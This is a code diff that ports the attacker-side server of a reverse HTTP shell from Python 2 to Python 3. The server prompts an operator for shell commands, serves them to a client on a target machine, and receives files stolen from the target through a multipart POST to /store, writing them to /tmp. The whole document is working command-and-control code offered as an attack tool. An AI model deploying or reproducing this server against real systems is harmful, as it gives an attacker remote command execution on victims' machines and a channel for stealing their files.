@@ -1,56 +1,60 @@
-#Server
+#Server ----> runs on the attacker's machine
 
-import BaseHTTPServer   # Built-in HTTP library
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import os,cgi
 
-HOST_NAME = '10.10.10.10'   # Host IP address
-PORT_NUMBER = 80   # Listening port number 
+HTTP_STATUS_OK = 200
 
+# IP and port the HTTP server listens on (will be queried by client.py)
+ATTACKER_IP = '0.0.0.0'
+ATTACKER_PORT = 8080
 
-class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 
+class MyHandler(BaseHTTPRequestHandler):
 
-    def do_GET(s):
-                                        
-        command = raw_input("Shell> ")   #Take user input
-        s.send_response(200)             #HTML status 200 (OK)
-        s.send_header("Content-type", "text/html")  
-        s.end_headers()
-        s.wfile.write(command)           #send the command which we got from the user input
+    def save_file(self):
+        print(self.headers['content-type'])
+        content_type, _ = cgi.parse_header(self.headers['content-type'])
+        if content_type != 'multipart/form-data':
+            raise "[-] Unexpected POST request, needs to be multipart/form-data"
 
-            
-    def do_POST(s):
+        fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
+        fs_up=fs['file']                #Here file is the key to hold the actual file
+        with open('/tmp/downloaded_file','wb') as output_file:
+            output_file.write(fs_up.file.read())
+        print("File saved as /tmp/downloaded_file")
 
-        if s.path=='/store':        #Check whether /store is appended or not
+    # Send command to client (on Target)
+    def do_GET(self):
+        command = input("Shell> ")
+        self.send_response(HTTP_STATUS_OK)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(command.encode())
+
+    def do_POST(self):
+        if self.path == '/store':
             try:
-                ctype,pdict=cgi.parse_header(s.headers.getheader('content-type'))
-                if ctype=='multipart/form-data':
-                    fs=cgi.FieldStorage(fp=s.rfile,headers=s.headers,environ={'REQUEST_METHOD':'POST'})
-                else:
-                    print "[-] Unexpected POST request"
-                fs_up=fs['file']                #Here file is the key to hold the actual file
-                with open('/root/Desktop/demo.txt','wb') as o:  #Create new file and write contents into this file
-                    o.write(fs_up.file.read())
-                    s.send_response(200)
-                    s.end_headers()
+                self.save_file()
             except Exception as e:
-                    print e
-            return 
-        s.send_response(200)                        
-        s.end_headers()
-        length  = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST data contains                                              
-        postVar = s.rfile.read(length)               # Read then print the posted data
-        print postVar
-        
-        
+                print(e)
+            finally:
+                self.send_response(200)
+                self.end_headers()
+                return
 
-if __name__ == '__main__':    
-    
-    server_class = BaseHTTPServer.HTTPServer
-    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
- 
-    try:     
-        httpd.serve_forever()   #if we got ctrl+c we will Interrupt and stop the server
-    except KeyboardInterrupt:   
-        print '[!] Server is terminated'
-        httpd.server_close()
+        self.send_response(200)
+        self.end_headers()
+        length  = int(self.headers['Content-Length'])
+        postVar = self.rfile.read(length) # Read then print the posted data
+        print(postVar.decode())
 
+
+if __name__ == '__main__':
+    myServer = HTTPServer((ATTACKER_IP, ATTACKER_PORT), MyHandler)
+
+    try:
+        print(f'[*] Server started on {ATTACKER_IP}:{ATTACKER_PORT}')
+        myServer.serve_forever()
+    except KeyboardInterrupt:
+        print('[!] Server is terminated')
+        myServer.server_close()
